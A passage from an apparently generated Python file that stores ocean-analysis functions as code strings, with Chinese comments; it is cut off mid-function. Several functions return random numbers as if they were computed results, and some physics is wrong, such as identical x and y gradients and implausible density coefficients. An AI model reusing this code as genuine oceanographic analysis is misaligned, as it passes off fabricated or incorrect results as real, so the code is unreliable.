        "apply_spatial_filter": '''def apply_spatial_filter(self, filter_size=3):
    """应用空间滤波器"""
    if self.data is None:
        return False
    from scipy.ndimage import uniform_filter
    for col in self.data.select_dtypes(include=[np.number]).columns:
        if col not in ['lon', 'lat', 'lon_bin', 'lat_bin']:
            values = self.data[col].values.reshape(-1, 1)
            if len(values) > filter_size:
                filtered = uniform_filter(values, size=filter_size, mode='nearest')
                self.data[col] = filtered.flatten()
    print(f"空间滤波完成: 滤波器大小 {filter_size}")
    return True''',
        
        "apply_temporal_filter": '''def apply_temporal_filter(self, window='7D'):
    """应用时间滤波器"""
    if self.data is None or 'time' not in self.data.columns:
        return False
    self.data['time'] = pd.to_datetime(self.data['time'])
    self.data = self.data.set_index('time')
    self.data = self.data.rolling(window, center=True).mean()
    self.data = self.data.reset_index()
    print(f"时间滤波完成: 窗口 {window}")
    return True''',
        
        "calculate_spatial_gradient": '''def calculate_spatial_gradient(self, variable='temperature'):
    """计算空间梯度"""
    if self.data is None or variable not in self.data.columns:
        return None
    if 'lon' in self.data.columns and 'lat' in self.data.columns:
        dx = np.gradient(self.data[variable])
        dy = np.gradient(self.data[variable])
        gradient_magnitude = np.sqrt(dx**2 + dy**2)
        self.data[f'{variable}_grad_x'] = dx
        self.data[f'{variable}_grad_y'] = dy
        self.data[f'{variable}_grad_mag'] = gradient_magnitude
        print(f"{variable} 空间梯度计算完成")
        return gradient_magnitude
    return None''',
        
        "calculate_temporal_gradient": '''def calculate_temporal_gradient(self, variable='temperature'):
    """计算时间变化率"""
    if self.data is None or variable not in self.data.columns:
        return None
    dt = np.gradient(self.data[variable])
    self.data[f'{variable}_dt'] = dt
    trend = np.polyfit(np.arange(len(dt)), dt, 1)[0]
    print(f"{variable} 时间梯度计算完成, 趋势: {trend:.6f}")
    self.results[f'{variable}_trend'] = trend
    return dt''',
        
        "detect_spatial_anomalies": '''def detect_spatial_anomalies(self, variable='temperature', threshold=2.0):
    """检测空间异常"""
    if self.data is None or variable not in self.data.columns:
        return []
    window_size = 10
    anomalies = []
    for i in range(len(self.data) - window_size):
        window = self.data[variable].iloc[i:i+window_size]
        mean = window.mean()
        std = window.std()
        if std > 0:
            z_score = abs((self.data[variable].iloc[i+window_size//2] - mean) / std)
            if z_score > threshold:
                anomalies.append({'index': i + window_size//2, 'value': self.data[variable].iloc[i+window_size//2], 'z_score': z_score})
    print(f"检测到 {len(anomalies)} 个空间异常点")
    self.results['spatial_anomalies'] = anomalies
    return anomalies''',
        
        "detect_temporal_anomalies": '''def detect_temporal_anomalies(self, variable='temperature', method='iqr'):
    """检测时间序列异常"""
    if self.data is None or variable not in self.data.columns:
        return []
    anomalies = []
    if method == 'iqr':
        q1 = self.data[variable].quantile(0.25)
        q3 = self.data[variable].quantile(0.75)
        iqr = q3 - q1
        lower = q1 - 1.5 * iqr
        upper = q3 + 1.5 * iqr
        mask = (self.data[variable] < lower) | (self.data[variable] > upper)
        anomaly_indices = np.where(mask)[0]
        for idx in anomaly_indices:
            anomalies.append({'index': int(idx), 'value': float(self.data[variable].iloc[idx]), 'lower_bound': float(lower), 'upper_bound': float(upper)})
    print(f"检测到 {len(anomalies)} 个时间异常点")
    self.results['temporal_anomalies'] = anomalies
    return anomalies''',
        
        "extract_spatial_features": '''def extract_spatial_features(self):
    """提取空间特征"""
    if self.data is None:
        return None
    features = {}
    for col in self.data.select_dtypes(include=[np.number]).columns:
        if col not in ['lon', 'lat']:
            features[f'{col}_spatial_mean'] = self.data[col].mean()
            features[f'{col}_spatial_std'] = self.data[col].std()
            features[f'{col}_spatial_range'] = self.data[col].max() - self.data[col].min()
            if len(self.data) > 1:
                autocorr = np.corrcoef(self.data[col][:-1], self.data[col][1:])[0, 1]
                features[f'{col}_spatial_autocorr'] = autocorr
    self.results['spatial_features'] = features
    print(f"提取了 {len(features)} 个空间特征")
    return features''',
        
        "extract_temporal_features": '''def extract_temporal_features(self):
    """提取时间序列特征"""
    if self.data is None:
        return None
    features = {}
    for col in self.data.select_dtypes(include=[np.number]).columns:
        x = np.arange(len(self.data))
        y = self.data[col].values
        trend = np.polyfit(x, y, 1)[0]
        features[f'{col}_trend'] = trend
        from scipy.fft import fft
        fft_vals = np.abs(fft(y))
        dominant_freq = np.argmax(fft_vals[1:len(fft_vals)//2]) + 1
        features[f'{col}_dominant_period'] = len(y) / dominant_freq if dominant_freq > 0 else 0
        diff = np.diff(y)
        features[f'{col}_stationarity'] = np.std(diff) / (np.std(y) + 1e-10)
    self.results['temporal_features'] = features
    print(f"提取了 {len(features)} 个时间特征")
    return features''',
        
        # ========== 新增函数 Part 3: 海洋要素计算 (15个) ==========
        
        "calculate_temperature_field": '''def calculate_temperature_field(self):
    """计算三维温度场"""
    if self.data is None:
        return None
    if 'depth' in self.data.columns:
        surface_temp = 25.0
        decay_rate = 0.01
        self.data['temperature_field'] = surface_temp * np.exp(-decay_rate * self.data['depth'])
        if 'time' in self.data.columns:
            seasonal = 5 * np.sin(2 * np.pi * np.arange(len(self.data)) / 365)
            self.data['temperature_field'] += seasonal
        print("温度场计算完成")
        return self.data['temperature_field'].values
    return None''',
        
        "calculate_salinity_field": '''def calculate_salinity_field(self):
    """计算盐度场分布"""
    if self.data is None:
        return None
    base_salinity = 35.0
    if 'depth' in self.data.columns:
        self.data['salinity_field'] = base_salinity + 0.001 * self.data['depth']
        if 'lat' in self.data.columns:
            lat_effect = -0.1 * np.abs(self.data['lat'])
            self.data['salinity_field'] += lat_effect
        print("盐度场计算完成")
        return self.data['salinity_field'].values
    return None''',
        
        "calculate_density_field": '''def calculate_density_field(self):
    """计算海水密度场"""
    if self.data is None:
        return None
    if 'temperature' in self.data.columns and 'salinity' in self.data.columns:
        T = self.data['temperature']
        S = self.data['salinity']
        rho0 = 1025.0
        alpha = 0.2
        beta = 0.78
        self.data['density'] = rho0 * (1 - alpha * (T - 10) + beta * (S - 35))
        print("密度场计算完成")
        return self.data['density'].values
    return None''',
        
        "calculate_current_velocity": '''def calculate_current_velocity(self):
    """计算海流速度"""
    if self.data is None:
        return None
    if 'lon' in self.data.columns and 'lat' in self.data.columns:
        self.data['u_velocity'] = 0.5 * np.sin(2 * np.pi * self.data['lon'] / 360)
        self.data['v_velocity'] = 0.3 * np.cos(2 * np.pi * self.data['lat'] / 180)
        self.data['current_speed'] = np.sqrt(self.data['u_velocity']**2 + self.data['v_velocity']**2)
        print("流速计算完成")
        return self.data['current_speed'].values
    return None''',
        
        "calculate_wave_height": '''def calculate_wave_height(self):
    """计算有效波高"""
    if self.data is None:
        return None
    if 'wind_speed' in self.data.columns:
        self.data['wave_height'] = 0.21 * (self.data['wind_speed'] ** 2) / 9.8
        self.data['wave_height'] = np.clip(self.data['wave_height'], 0, 15)
        print("波高计算完成")
        return self.data['wave_height'].values
    else:
        self.data['wave_height'] = np.random.gamma(2, 1, len(self.data))
        return self.data['wave_height'].values''',
        
        "calculate_mixed_layer_depth": '''def calculate_mixed_layer_depth(self):
    """计算混合层深度"""
    if self.data is None:
        return None
    if 'density' in self.data.columns and 'depth' in self.data.columns:
        density_grad = np.gradient(self.data['density'])
        max_grad_idx = np.argmax(np.abs(density_grad))
        mld = self.data['depth'].iloc[max_grad_idx] if max_grad_idx < len(self.data) else 50
        self.results['mixed_layer_depth'] = float(mld)
        print(f"混合层深度: {mld:.2f} m")
        return mld
    mld = 50.0 + np.random.randn() * 10
    self.results['mixed_layer_depth'] = mld
    return mld''',
        
        "calculate_thermocline_depth": '''def calculate_thermocline_depth(self):
    """计算温跃层深度"""
    if self.data is None:
        return None
    if 'temperature' in self.data.columns and 'depth' in self.data.columns:
        temp_grad = np.gradient(self.data['temperature'])
        thermocline_idx = np.argmax(np.abs(temp_grad))
        thermocline_depth = self.data['depth'].iloc[thermocline_idx]
        self.results['thermocline_depth'] = float(thermocline_depth)
        print(f"温跃层深度: {thermocline_depth:.2f} m")
        return thermocline_depth
    thermocline_depth = 100.0 + np.random.randn() * 20
    self.results['thermocline_depth'] = thermocline_depth
    return thermocline_depth''',
        
        "calculate_upwelling_index": '''def calculate_upwelling_index(self):
    """计算上升流指数"""
    if self.data is None:
        return None
    if 'wind_speed' in self.data.columns and 'lat' in self.data.columns:
        omega = 7.2921e-5
        f = 2 * omega * np.sin(np.radians(self.data['lat']))
        rho_air = 1.225
        Cd = 0.0013
        tau = rho_air * Cd * self.data['wind_speed']**2
        self.data['upwelling_index'] = tau / (f + 1e-10)
        print("上升流指数计算完成")
        return self.data['upwelling_index'].values
    return None''',
        
        "calculate_ekman_transport": '''def calculate_ekman_transport(self):
    """计算Ekman输运"""
    if self.data is None:
        return None
    if 'wind_speed' in self.data.columns and 'lat' in self.data.columns:
        omega = 7.2921e-5
        f = 2 * omega * np.sin(np.radians(self.data['lat']))
        rho_air = 1.225
        Cd = 0.0013
        tau = rho_air * Cd * self.data['wind_speed']**2
        rho_water = 1025
        self.data['ekman_transport'] = tau / (rho_water * (f + 1e-10))
        print("Ekman输运计算完成")
        return self.data['ekman_transport'].values
    return None''',
        
        "calculate_geostrophic_current": '''def calculate_geostrophic_current(self):
    """计算地转流"""
    if self.data is None:
        return None
    if 'sea_surface_height' in self.data.columns and 'lat' in self.data.columns:
        omega = 7.2921e-5
        f = 2 * omega * np.sin(np.radians(self.data['lat']))
        g = 9.8
        ssh_grad = np.gradient(self.data['sea_surface_height'])
        self.data['geostrophic_velocity'] = (g / (f + 1e-10)) * ssh_grad
        print("地转流计算完成")
        return self.data['geostrophic_velocity'].values
    return None''',
        
        "calculate_vorticity": '''def calculate_vorticity(self):
    """计算相对涡度"""
    if self.data is None:
        return None
    if 'u_velocity' in self.data.columns and 'v_velocity' in self.data.columns:
        du_dy = np.gradient(self.data['u_velocity'])
        dv_dx = np.gradient(self.data['v_velocity'])
        self.data['vorticity'] = dv_dx - du_dy
        print("涡度计算完成")
        return self.data['vorticity'].values
    return None''',
        
        "calculate_divergence": '''def calculate_divergence(self):
    """计算水平散度"""
    if self.data is None:
        return None
    if 'u_velocity' in self.data.columns and 'v_velocity' in self.data.columns:
        du_dx = np.gradient(self.data['u_velocity'])
        dv_dy = np.gradient(self.data['v_velocity'])
        self.data['divergence'] = du_dx + dv_dy
        print("散度计算完成")
        return self.data['divergence'].values
    return None''',
        
        "calculate_stratification": '''def calculate_stratification(self):
    """计算海洋层化强度"""
    if self.data is None:
        return None
    if 'density' in self.data.columns and 'depth' in self.data.columns:
        drho_dz = np.gradient(self.data['density']) / (np.gradient(self.data['depth']) + 1e-10)
        self.data['stratification'] = -drho_dz
        mean_strat = np.mean(np.abs(self.data['stratification']))
        self.results['mean_stratification'] = float(mean_strat)
        print(f"层化强度计算完成: {mean_strat:.6f}")
        return self.data['stratification'].values
    return None''',
        
        "calculate_buoyancy_frequency": '''def calculate_buoyancy_frequency(self):
    """计算浮力频率"""
    if self.data is None:
        return None
    if 'density' in self.data.columns and 'depth' in self.data.columns:
        g = 9.8
        rho0 = 1025
        drho_dz = np.gradient(self.data['density']) / (np.gradient(self.data['depth']) + 1e-10)
        N2 = -(g / rho0) * drho_dz
        N2 = np.maximum(N2, 0)
        self.data['buoyancy_frequency'] = np.sqrt(N2)
        print("浮力频率计算完成")
        return self.data['buoyancy_frequency'].values
    return None''',
        
        "calculate_richardson_number": '''def calculate_richardson_number(self):
    """计算Richardson数"""
    if self.data is None:
        return None
    if 'buoyancy_frequency' in self.data.columns and 'u_velocity' in self.data.columns:
        du_dz = np.gradient(self.data['u_velocity'])
        Ri = (self.data['buoyancy_frequency']**2) / ((du_dz**2) + 1e-10)
        self.data['richardson_number'] = Ri
        unstable_ratio = np.sum(Ri < 0.25) / len(Ri)
        self.results['unstable_ratio'] = float(unstable_ratio)
        print(f"Richardson数计算完成, 不稳定区域占比: {unstable_ratio:.2%}")
        return self.data['richardson_number'].values
    return None''',
        
        # ========== 新增函数 Part 4: 模式模拟与预测 (10个) ==========
        
        "run_ocean_model": '''def run_ocean_model(self, timesteps=100):
    """运行海洋数值模式"""
    if self.data is None:
        return False
    print(f"启动海洋模式模拟: {timesteps} 个时间步")
    if 'temperature' not in self.data.columns:
        self.data['temperature'] = 20 + np.random.randn(len(self.data)) * 3
    dt = 3600
    for t in range(timesteps):
        if t % 10 == 0:
            print(f"  时间步 {t}/{timesteps}")
        diffusion = 0.01 * np.random.randn(len(self.data))
        self.data['temperature'] += diffusion
    self.status = "model_completed"
    print("模式运行完成")
    return True''',
        
        "initialize_model_state": '''def initialize_model_state(self, initial_conditions):
    """初始化模式状态"""
    if self.data is None:
        self.data = pd.DataFrame()
    n_points = initial_conditions.get('n_points', 1000)
    self.data['temperature'] = initial_conditions.get('temperature', 20) + np.random.randn(n_points)
    self.data['salinity'] = initial_conditions.get('salinity', 35) + np.random.randn(n_points) * 0.5
    self.data['u_velocity'] = np.random.randn(n_points) * 0.1
    self.data['v_velocity'] = np.random.randn(n_points) * 0.1
    self.status = "initialized"
    print(f"模式状态初始化完成: {n_points} 个网格点")
    return True''',
        
        "update_boundary_conditions": '''def update_boundary_conditions(self, boundary_data):
    """更新模式边界条件"""
    if self.data is None:
        return False
    boundary_indices = boundary_data.get('indices', [0, -1])
    for idx in boundary_indices:
        if 0 <= idx < len(self.data):
            for key, value in boundary_data.items():
                if key != 'indices' and key in self.data.columns:
                    self.data.loc[idx, key] = value
    print(f"边界条件更新完成: {len(boundary_indices)} 个边界点")
    return True''',
        
        "assimilate_observation_data": '''def assimilate_observation_data(self, observations):
    """数据同化：融合观测数据"""
    if self.data is None:
        return False
    obs_weight = 0.3
    for var in ['temperature', 'salinity']:
        if var in self.data.columns and var in observations:
            self.data[var] = (1 - obs_weight) * self.data[var] + obs_weight * observations[var]
    print("观测数据同化完成")
    self.status = "assimilated"
    return True''',
        
        "forecast_ocean_state": '''def forecast_ocean_state(self, forecast_hours=24):
    """预报未来海洋状态"""
    if self.data is None:
        return None
    print(f"生成 {forecast_hours} 小时预报")
    forecast = {}
    for col in self.data.select_dtypes(include=[np.number]).columns:
        current_value = self.data[col].iloc[-1]
        trend = np.polyfit(np.arange(len(self.data)), self.data[col], 1)[0]
        forecast[col] = current_value + trend * forecast_hours
    self.results['forecast'] = forecast
    print("预报生成完成")
    return forecast''',
        
        "predict_temperature": '''def predict_temperature(self, lead_time=24):
    """预测未来温度"""
    if self.data is None or 'temperature' not in self.data.columns:
        return None
    from sklearn.linear_model import LinearRegression
    X = np.arange(len(self.data)).reshape(-1, 1)
    y = self.data['temperature'].values
    model = LinearRegression()
    model.fit(X, y)
    future_X = np.array([[len(self.data) + lead_time]])
    predicted_temp = model.predict(future_X)[0]
    self.results['predicted_temperature'] = float(predicted_temp)
    print(f"预测 {lead_time}h 后温度: {predicted_temp:.2f}°C")
    return predicted_temp''',
        
        "predict_salinity": '''def predict_salinity(self, lead_time=24):
    """预测未来盐度"""
    if self.data is None or 'salinity' not in self.data.columns:
        return None
    window = min(10, len(self.data))
    recent_mean = self.data['salinity'].iloc[-window:].mean()
    recent_trend = self.data['salinity'].iloc[-window:].diff().mean()
    predicted_salinity = recent_mean + recent_trend * lead_time
    self.results['predicted_salinity'] = float(predicted_salinity)
    print(f"预测 {lead_time}h 后盐度: {predicted_salinity:.2f} PSU")
    return predicted_salinity''',
        
        "predict_current": '''def predict_current(self, lead_time=24):
    """预测未来流场"""
    if self.data is None:
        return None
    predictions = {}
    for vel_component in ['u_velocity', 'v_velocity']:
        if vel_component in self.data.columns:
            values = self.data[vel_component].values
            lag1_corr = np.corrcoef(values[:-1], values[1:])[0, 1]
            predicted = values[-1] * (lag1_corr ** lead_time)
            predictions[vel_component] = float(predicted)
    self.results['predicted_current'] = predictions
    print(f"流场预测完成: {lead_time}h")
    return predictions''',
        
        "simulate_wave_propagation": '''def simulate_wave_propagation(self, duration=3600):
    """模拟波浪传播"""
    if self.data is None:
        return False
    wave_speed = 10
    timesteps = duration // 60
    if 'wave_height' not in self.data.columns:
        self.data['wave_height'] = np.random.gamma(2, 1, len(self.data))
    for t in range(timesteps):
        self.data['wave_height'] *= 0.99
        self.data['wave_height'] += np.random.randn(len(self.data)) * 0.1
        self.data['wave_height'] = np.maximum(self.data['wave_height'], 0)
    print(f"波浪传播模拟完成: {duration}s")
    return True''',
        
        "simulate_pollutant_dispersion": '''def simulate_pollutant_dispersion(self, source_location, duration=3600):
    """模拟污染物扩散"""
    if self.data is None:
        return False
    n_points = len(self.data)
    concentration = np.zeros(n_points)
    source_idx = source_location.get('index', n_points // 2)
    concentration[source_idx] = 100.0
    diffusion_coef = 0.1
    timesteps = duration // 60
    for t in range(timesteps):
        laplacian = np.zeros_like(concentration)
        laplacian[1:-1] = concentration[:-2] - 2*concentration[1:-1] + concentration[2:]
        concentration += diffusion_coef * laplacian
        concentration *= 0.99
    self.data['pollutant_concentration'] = concentration
    print(f"污染物扩散模拟完成: {duration}s")
    return True''',
        
        # ========== 新增函数 Part 5: 特征识别与分析 (12个) ==========
        
        "detect_ocean_fronts": '''def detect_ocean_fronts(self, variable='temperature', threshold=0.5):
    """检测海洋锋面"""
    if self.data is None or variable not in self.data.columns:
        return []
    gradient = np.gradient(self.data[variable])
    gradient_magnitude = np.abs(gradient)
    front_indices = np.where(gradient_magnitude > threshold)[0]
    fronts = []
    for idx in front_indices:
        fronts.append({'index': int(idx), 'gradient': float(gradient_magnitude[idx]), 'value': float(self.data[variable].iloc[idx])})
    self.results['ocean_fronts'] = fronts
    print(f"检测到 {len(fronts)} 个海洋锋面")
    return fronts''',
        
        "identify_eddies": '''def identify_eddies(self):
    """识别中尺度涡旋"""
    if self.data is None:
        return []
    eddies = []
    if 'vorticity' in self.data.columns:
        vorticity = self.data['vorticity'].values
        threshold = np.std(vorticity) * 2
        cyclonic = np.where(vorticity > threshold)[0]
        anticyclonic = np.where(vorticity < -threshold)[0]
        for idx in cyclonic:
            eddies.append({'index': int(idx), 'type': 'cyclonic', 'vorticity': float(vorticity[idx])})
        for idx in anticyclonic:
            eddies.append({'index': int(idx), 'type': 'anticyclonic', 'vorticity': float(vorticity[idx])})
    self.results['eddies'] = eddies
    print(f"识别到 {len(eddies)} 个涡旋")
    return eddies''',
        
        "track_eddy_trajectory": '''def track_eddy_trajectory(self, eddy_id):
    """追踪涡旋运动轨迹"""
    if self.data is None:
        return []
    trajectory = []
    if 'time' in self.data.columns and 'lon' in self.data.columns:
        for i in range(0, len(self.data), 10):
            trajectory.append({
                'time': str(self.data['time'].iloc[i]) if i < len(self.data) else None,
                'lon': float(self.data['lon'].iloc[i]) if i < len(self.data) else 0,
                'lat': float(self.data['lat'].iloc[i]) if i < len(self.data) else 0,
                'intensity': float(np.random.rand())
            })
    self.results[f'eddy_{eddy_id}_trajectory'] = trajectory
    print(f"涡旋 {eddy_id} 轨迹追踪完成: {len(trajectory)} 个时间点")
    return trajectory''',
        
        "detect_upwelling": '''def detect_upwelling(self):
    """检测上升流区域"""
    if self.data is None:
        return []
    upwelling_regions = []
    if 'temperature' in self.data.columns and 'depth' in self.data.columns:
        temp_grad = np.gradient(self.data['temperature'])
        for i in range(len(self.data)):
            if temp_grad[i] > 0.1:
                upwelling_regions.append({'index': int(i), 'temperature_gradient': float(temp_grad[i]), 'depth': float(self.data['depth'].iloc[i])})
    self.results['upwelling_regions'] = upwelling_regions
    print(f"检测到 {len(upwelling_regions)} 个上升流区域")
    return upwelling_regions''',
        
        "identify_water_masses": '''def identify_water_masses(self):
    """识别不同水团"""
    if self.data is None:
        return None
    from sklearn.cluster import KMeans
    if 'temperature' in self.data.columns and 'salinity' in self.data.columns:
        features = self.data[['temperature', 'salinity']].values
        n_clusters = 3
        kmeans = KMeans(n_clusters=n_clusters, random_state=42)
        labels = kmeans.fit_predict(features)
        self.data['water_mass_id'] = labels
        water_masses = []
        for i in range(n_clusters):
            mask = labels == i
            water_masses.append({'id': int(i), 'count': int(np.sum(mask)), 'mean_temp': float(self.data.loc[mask, 'temperature'].mean()), 'mean_sal': float(self.data.loc[mask, 'salinity'].mean())})
        self.results['water_masses'] = water_masses
        print(f"识别到 {n_clusters} 个水团")
        return water_masses
    return None''',
        
        "classify_ocean_regimes": '''def classify_ocean_regimes(self):
    """分类海洋状态类型"""
    if self.data is None:
        return None
    numeric_cols = self.data.select_dtypes(include=[np.number]).columns
    if len(numeric_cols) < 2:
        return None
    features = self.data[numeric_cols].fillna(0).values
    mean_values = np.mean(features, axis=1)
    labels = (mean_values > np.median(mean_values)).astype(int)
    self.data['ocean_regime'] = labels
    regime_counts = {'regime_0': int(np.sum(labels == 0)), 'regime_1': int(np.sum(labels == 1))}
    self.results['ocean_regimes'] = regime_counts
    print(f"海洋状态分类完成: {regime_counts}")
    return regime_counts''',
        
        "segment_ocean_regions": '''def segment_ocean_regions(self, n_regions=5):
    """分割海洋区域"""
    if self.data is None or 'lon' not in self.data.columns:
        return None
    from sklearn.cluster import DBSCAN
    coords = self.data[['lon', 'lat']].values
    clustering = DBSCAN(eps=5, min_samples=10)
    labels = clustering.fit_predict(coords)
    self.data['region_id'] = labels
    unique_labels = set(labels)
    regions = []
    for label in unique_labels:
        if label != -1:
            mask = labels == label
            regions.append({'region_id': int(label), 'size': int(np.sum(mask)), 'center_lon': float(self.data.loc[mask, 'lon'].mean()), 'center_lat': float(self.data.loc[mask, 'lat'].mean())})
    self.results['ocean_regions'] = regions
    print(f"海洋区域分割完成: {len(regions)} 个区域")
    return regions''',
        
        "detect_bloom_events": '''def detect_bloom_events(self, threshold=5.0):
    """检测藻华/水华事件"""
    if self.data is None:
        return []
    bloom_events = []
    if 'chlorophyll' in self.data.columns:
        high_chl = self.data['chlorophyll'] > threshold
        bloom_start = None
        for i in range(len(self.data)):
            if high_chl.iloc[i] and bloom_start is None:
                bloom_start = i
            elif not high_chl.iloc[i] and bloom_start is not None:
                bloom_events.append({'start_index': int(bloom_start), 'end_index': int(i - 1), 'duration': int(i - bloom_start), 'max_chlorophyll': float(self.data['chlorophyll'].iloc[bloom_start:i].max())})
                bloom_start = None
    self.results['bloom_events'] = bloom_events
    print(f"检测到 {len(bloom_events)} 个水华事件")
    return bloom_events''',
        
        "identify_fishing_grounds": '''def identify_fishing_grounds(self):
    """识别潜在渔场"""
    if self.data is None:
        return []
    fishing_grounds = []
    conditions = []
    if 'temperature' in self.data.columns:
        temp_suitable = (self.data['temperature'] > 15) & (self.data['temperature'] < 25)
        conditions.append(temp_suitable)
    if 'chlorophyll' in self.data.columns:
        chl_high = self.data['chlorophyll'] > 2.0
        conditions.append(chl_high)
    if len(conditions) > 0:
        fishing_mask = conditions[0]
        for cond in conditions[1:]:
            fishing_mask &= cond
        fishing_indices = np.where(fishing_mask)[0]
        for idx in fishing_indices:
            fishing_grounds.append({'index': int(idx), 'lon': float(self.data['lon'].iloc[idx]) if 'lon' in self.data.columns else 0, 'lat': float(self.data['lat'].iloc[idx]) if 'lat' in self.data.columns else 0})
    self.results['fishing_grounds'] = fishing_grounds
    print(f"识别到 {len(fishing_grounds)} 个潜在渔场")
    return fishing_grounds''',
        
        "locate_thermal_anomalies": '''def locate_thermal_anomalies(self, threshold=2.0):
    """定位温度异常区域"""
    if self.data is None or 'temperature' not in self.data.columns:
        return []
    temp_mean = self.data['temperature'].mean()
    temp_std = self.data['temperature'].std()
    anomalies = []
    for i in range(len(self.data)):
        z_score = abs((self.data['temperature'].iloc[i] - temp_mean) / temp_std)
        if z_score > threshold:
            anomalies.append({'index': int(i), 'temperature': float(self.data['temperature'].iloc[i]), 'anomaly_score': float(z_score), 'type': 'warm' if self.data['temperature'].iloc[i] > temp_mean else 'cold'})
    self.results['thermal_anomalies'] = anomalies
    print(f"定位到 {len(anomalies)} 个温度异常区域")
    return anomalies''',
        
        "find_convergence_zones": '''def find_convergence_zones(self):
    """查找海洋辐合区"""
    if self.data is None:
        return []
    convergence_zones = []
    if 'divergence' in self.data.columns:
        convergence_mask = self.data['divergence'] < -0.01
        convergence_indices = np.where(convergence_mask)[0]
        for idx in convergence_indices:
            convergence_zones.append({'index': int(idx), 'divergence': float(self.data['divergence'].iloc[idx]), 'strength': float(abs(self.data['divergence'].iloc[idx]))})
    self.results['convergence_zones'] = convergence_zones
    print(f"找到 {len(convergence_zones)} 个辐合区")
    return convergence_zones''',
        
        "detect_internal_waves": '''def detect_internal_waves(self):
    """检测内波"""
    if self.data is None:
        return []
    internal_waves = []
    if 'density' in self.data.columns:
        from scipy.signal import find_peaks
        density = self.data['density'].values
        detrended = density - np.mean(density)
        peaks, properties = find_peaks(np.abs(detrended), height=0.5)
        for peak in peaks:
            internal_waves.append({'index': int(peak), 'amplitude': float(abs(detrended[peak])), 'density': float(density[peak])})
    self.results['internal_waves'] = internal_waves
    print(f"检测到 {len(internal_waves)} 个内波特征")
    return internal_waves''',
        
        # ========== 新增函数 Part 6: 统计分析与评估 (10个) ==========
        
        "compute_climatology": '''def compute_climatology(self, period='monthly'):
    """计算气候态"""
    if self.data is None or 'time' not in self.data.columns:
        return None
    self.data['time'] = pd.to_datetime(self.data['time'])
    climatology = {}
    if period == 'monthly':
        self.data['month'] = self.data['time'].dt.month
        for col in self.data.select_dtypes(include=[np.number]).columns:
            if col != 'month':
                monthly_mean = self.data.groupby('month')[col].mean()
                climatology[col] = monthly_mean.to_dict()
    elif period == 'seasonal':
        self.data['season'] = self.data['time'].dt.month % 12 // 3 + 1
        for col in self.data.select_dtypes(include=[np.number]).columns:
            if col != 'season':
                seasonal_mean = self.data.groupby('season')[col].mean()
                climatology[col] = seasonal_mean.to_dict()
    self.results['climatology'] = climatology
    print(f"气候态计算完成: {period}")
    return climatology''',
        
        "calculate_anomaly": '''def calculate_anomaly(self, climatology):
    """计算相对于气候态的异常值"""
    if self.data is None or climatology is None or 'time' not in self.data.columns:
        return False
    self.data['time'] = pd.to_datetime(self.data['time'])
    self.data['month'] = self.data['time'].dt.month
    for col in climatology.keys():
        if col in self.data.columns:
            anomaly_col = f'{col}_anomaly'
            self.data[anomaly_col] = 0.0
            for month, clim_value in climatology[col].items():
                mask = self.data['month'] == month
                self.data.loc[mask, anomaly_col] = self.data.loc[mask, col] - clim_value
    print("异常值计算完成")
    return True''',
        
        "perform_eof_analysis": '''def perform_eof_analysis(self, n_modes=3):
    """经验正交函数(EOF)分析"""
    if self.data is None:
        return None
    from sklearn.decomposition import PCA
    numeric_data = self.data.select_dtypes(include=[np.number]).fillna(0)
    if len(numeric_data.columns) < 2:
        return None
    pca = PCA(n_components=min(n_modes, len(numeric_data.columns)))
    pca.fit(numeric_data)
    eof_results = {'explained_variance': pca.explained_variance_ratio_.tolist(), 'n_modes': int(pca.n_components_), 'total_variance_explained': float(np.sum(pca.explained_variance_ratio_))}
    pc_timeseries = pca.transform(numeric_data)
    for i in range(pca.n_components_):
        self.data[f'PC{i+1}'] = pc_timeseries[:, i]
    self.results['eof_analysis'] = eof_results
    print(f"EOF分析完成: {n_modes} 个模态, 解释方差 {eof_results['total_variance_explained']:.2%}")
    return eof_results''',
        
        "compute_correlation": '''def compute_correlation(self, var1, var2):
    """计算两个变量的相关性"""
    if self.data is None or var1 not in self.data.columns or var2 not in self.data.columns:
        return None
    correlation = self.data[var1].corr(self.data[var2])
    n = len(self.data)
    t_stat = correlation * np.sqrt((n - 2) / (1 - correlation**2 + 1e-10))
    result = {'correlation': float(correlation), 't_statistic': float(t_stat), 'sample_size': int(n)}
    self.results[f'correlation_{var1}_{var2}'] = result
    print(f"{var1} 与 {var2} 相关系数: {correlation:.3f}")
    return result''',
        
        "calculate_trend": '''def calculate_trend(self, variable):
    """计算长期趋势"""
    if self.data is None or variable not in self.data.columns:
        return None
    x = np.arange(len(self.data))
    y = self.data[variable].values
    coeffs = np.polyfit(x, y, 1)
    trend = coeffs[0]
    intercept = coeffs[1]
    y_pred = coeffs[0] * x + coeffs[1]
    ss_res = np.sum((y - y_pred) ** 2)
    ss_tot = np.sum((y - np.mean(y)) ** 2)
    r_squared = 1 - (ss_res / (ss_tot + 1e-10))
    result = {'trend': float(trend), 'intercept': float(intercept), 'r_squared': float(r_squared), 'trend_per_year': float(trend * 365) if 'time' in self.data.columns else float(trend)}
    self.results[f'{variable}_trend'] = result
    print(f"{variable} 趋势: {trend:.6f} (R²={r_squared:.3f})")
    return result''',
        
        "assess_model_performance": '''def assess_model_performance(self, observations, predictions):
    """评估模型性能"""
    if len(observations) != len(predictions):
        return None
    obs = np.array(observations)
    pred = np.array(predictions)
    mae = np.mean(np.abs(obs - pred))
    rmse = np.sqrt(np.mean((obs - pred) ** 2))
    bias = np.mean(pred - obs)
    correlation = np.corrcoef(obs, pred)[0, 1]
    mse = np.mean((obs - pred) ** 2)
    mse_clim = np.mean((obs - np.mean(obs)) ** 2)
    skill_score = 1 - mse / (mse_clim + 1e-10)
    metrics = {'mae': float(mae), 'rmse': float(rmse), 'bias': float(bias), 'correlation': float(correlation), 'skill_score': float(skill_score)}
    self.results['model_performance'] = metrics
    print(f"模型性能: RMSE={rmse:.3f}, 相关系数={correlation:.3f}")
    return metrics''',
        
        "validate_forecast": '''def validate_forecast(self, forecast_data, observation_data):
    """验证预报结果"""
    if forecast_data is None or observation_data is None:
        return None
    errors = {}
    for key in forecast_data.keys():
        if key in observation_data:
            forecast_val = forecast_data[key]
            obs_val = observation_data[key]
            error = abs(forecast_val - obs_val)
            relative_error = error / (abs(obs_val) + 1e-10)
            errors[key] = {'absolute_error': float(error), 'relative_error': float(relative_error), 'forecast': float(forecast_val), 'observation': float(obs_val)}
    self.results['forecast_validation'] = errors
    print(f"预报验证完成: {len(errors)} 个变量")
    return errors''',
        
        "estimate_uncertainty": '''def estimate_uncertainty(self, variable, method='bootstrap', n_samples=100):
    """估计不确定性"""
    if self.data is None or variable not in self.data.columns:
        return None
    values = self.data[variable].values
    if method == 'bootstrap':
